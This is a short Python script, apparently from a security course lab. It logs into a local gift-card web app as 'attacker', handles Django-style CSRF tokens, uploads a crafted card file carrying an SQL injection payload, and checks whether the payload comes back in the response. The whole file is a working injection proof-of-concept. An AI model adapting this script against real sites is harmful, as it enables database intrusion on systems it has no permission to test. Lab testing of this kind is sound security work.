import re,json
import requests

url = "http://127.0.0.1/login.html"
url2 = "http://127.0.0.1/useCard.html"

data = {
    'uname':'attacker',
    'pword':'attacker'
}

files = {
    'card_data':('ank8821-sqli.gftcrd',open('ank8821-sqli.gftcrd','rb'),'application/octet-stream'),
    'card_supplied':(None,True),
    'card_fname':(None,'')
}
with open(files['card_data'][0],'r') as f:
    q = json.load(f)
    payload = q['records'][0]['signature']

proxy = {'http':'http://127.0.0.1:8080'}
with requests.Session() as session:

    # Getting the initial csrftoken
    get_token = session.get(url).headers
    csrf = re.search('csrftoken=\w*',get_token['Set-Cookie']).group(0).split('=')
    print("Performing Login")

    # Loggin in using the obtained token
    data['csrfmiddlewaretoken']=csrf[1]
    r = session.post(url,data=data,allow_redirects=False).headers

    # Grabbing the new csrf token and session id
    new_csrf = re.search('csrftoken=\w*',r['Set-Cookie']).group(0).split('=')
    sessid = re.search('sessionid=\w*',r['Set-Cookie']).group(0).split('=')
    cookie = {sessid[0]:sessid[1]}
    files['csrfmiddlewaretoken'] = (None,new_csrf[1])
    print("Checking for SQLi Injection")

    # Sending payload after logging in and checking for SQLi
    req = session.post(url2,cookies=cookie,files=files)
    res = req.text.replace('&#x27;','\'')
    if payload in res:
        print("\nFound Payload: \" {} \" in server response".format(payload))
        print('\nVulnerable to SQLi!')
    else:
        print("\nNot Vulnerable to SQLi!")